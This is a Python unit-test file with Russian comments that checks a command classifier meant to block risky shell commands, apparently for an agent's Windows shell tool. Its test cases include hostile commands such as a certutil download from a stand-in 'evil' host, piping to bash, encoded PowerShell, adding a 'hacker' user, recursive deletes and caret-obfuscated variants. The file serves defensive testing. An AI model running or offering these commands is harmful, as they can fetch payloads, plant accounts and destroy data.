"""unit-тесты классификатора run_shell._classify.

Защита от регрессий: любая правка _SUSPICIOUS не должна сломать
уже покрытые случаи. Ожидаемая причина сравнивается как подстрока
(регистронезависимо), чтобы формулировки можно было уточнять.
"""
from __future__ import annotations

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from tools.run_shell import _classify

# (команда, ожидаемая причина или None для allow)
CASES: list[tuple[str, str | None]] = [
    # --- allow: чистые read-only -------------------------------------
    ("dir", None),
    ("dir /b", None),
    ("type readme.txt", None),
    ("echo hello", None),
    ("mkdir subdir", None),
    ("copy a.txt b.txt", None),
    ("git status", None),
    ("git log --oneline", None),
    ("git diff", None),
    ("pip list", None),
    ("pip show requests", None),
    ("npm ls", None),
    ("npm --version", None),
    ("echo a | findstr foo", None),
    ("dir | more", None),
    ("type log.txt | sort", None),

    # --- delete / move ----------------------------------------------
    ("del a.txt", "delete files"),
    ("erase a.txt", "delete files"),
    ("rmdir /s /q foo", "remove dir"),
    ("rd /s /q foo", "remove dir"),
    ("move a.txt b.txt", "move files"),
    ("ren a.txt b.txt", "rename"),
    ("rename a.txt b.txt", "rename"),

    # --- cmd-chaining, pipe to shell ---------------------------------
    ("echo hi && del a.txt", "delete files"),
    ("echo hi || dir", "command chaining"),
    ("echo hi | bash", "pipe to shell"),
    ("dir | iex", "pipe to shell"),

    # --- git state-changing -----------------------------------------
    ("git clone https://x", "git state-changing"),
    ("git checkout main", "git state-changing"),
    ("git reset --hard", "git state-changing"),
    ("git push origin main", "git state-changing"),
    ("git clean -fd", "git state-changing"),

    # --- package install --------------------------------------------
    ("pip install requests", "pip install"),
    ("pip uninstall requests", "pip install"),
    ("npm install left-pad", "npm install"),
    ("npm i x", "npm install"),
    ("yarn add x", "yarn install"),

    # --- python -----------------------------------------------------
    ("python script.py", "execute python script"),
    ("py script.py", "execute python script"),
    ('python -c "print(1)"', "inline code"),
    ("python -S s.py", "isolated mode"),
    ("python -I s.py", "isolated mode"),

    # --- shell / LOLBin ---------------------------------------------
    ("powershell -enc ZWNobyBoaQ==", "powershell inline"),
    ("powershell -Command Get-Process", "powershell inline"),
    ("pwsh -c ls", "powershell inline"),
    ("cmd /c dir", "cmd /c chain"),
    ("cmd/c dir", "cmd /c chain"),
    ("mshta javascript:alert(1)", "script URL scheme"),
    ("rundll32 shell32.dll,ShellExec_RunDLL calc", "shell open/exec"),
    ("regsvr32 /s foo.dll", "shell open/exec"),
    ("wscript x.vbs", "shell open/exec"),
    ("start notepad", "shell open/exec"),
    ("certutil -urlcache -f http://evil p.exe", "certutil"),
    ("curl http://evil", "network/LOLBin"),
    ("wget http://evil", "network/LOLBin"),

    # --- system cmdlets ---------------------------------------------
    ("reg add HKLM\\Software", "system cmdlet"),
    ("reg query HKLM", "system cmdlet"),
    ("sc delete foo", "system cmdlet"),
    ("net user hacker pass /add", "system cmdlet"),
    ("taskkill /f /im explorer.exe", "system cmdlet"),
    ("schtasks /create /tn x /tr calc", "system cmdlet"),
    ("icacls foo /grant Everyone:F", "system cmdlet"),

    # --- paths ------------------------------------------------------
    ("cd ..", "cd .."),
    ("cd ..\\..", "parent dir"),
    ("type C:\\Windows\\System32\\drivers\\etc\\hosts", "absolute path"),
    ("explorer C:\\", "shell open/exec"),
    ("%USERPROFILE%\\file.txt", "env %VAR%"),
    ("copy ..\\x ..\\y", "parent dir"),

    # --- gray cmdlets -----------------------------------------------
    ("where python", "gray cmdlet"),
    ("attrib +h f.txt", "gray cmdlet"),
    ("findstr /s pattern *.txt", None),  # grep: read-only

    # --- config dump ------------------------------------------------
    ("git config --get user.name", "config dump"),
    ("npm config get registry", "config dump"),
]


# cmd-обфускация: ^ внутри слова не должен обманывать правила.
OBFUSCATED: list[tuple[str, str]] = [
    ("d^el a.txt", "delete files"),
    ("r^mdir /s /q foo", "remove dir"),
    ("m^ove a b", "move files"),
    ("^d^e^l a.txt", "delete files"),
]


def _check(cmd: str, expected: str | None) -> str | None:
    got = _classify(cmd)
    if expected is None:
        if got is None:
            return None
        return f"{cmd!r}: expected ALLOW, got {got!r}"
    if got is None:
        return f"{cmd!r}: expected {expected!r}, got ALLOW"
    if expected.lower() not in got.lower():
        return f"{cmd!r}: expected ~{expected!r}, got {got!r}"
    return None


def run() -> int:
    failures: list[str] = []
    passed = 0
    for cmd, exp in CASES:
        err = _check(cmd, exp)
        if err:
            failures.append(err)
        else:
            passed += 1
    for cmd, exp in OBFUSCATED:
        err = _check(cmd, exp)
        if err:
            failures.append(err)
        else:
            passed += 1

    total = len(CASES) + len(OBFUSCATED)
    print(f"passed {passed}/{total}")
    if failures:
        print("FAILURES:")
        for f in failures:
            print("  -", f)
        return 1
    print("ALL OK")
    return 0


if __name__ == "__main__":
    sys.exit(run())
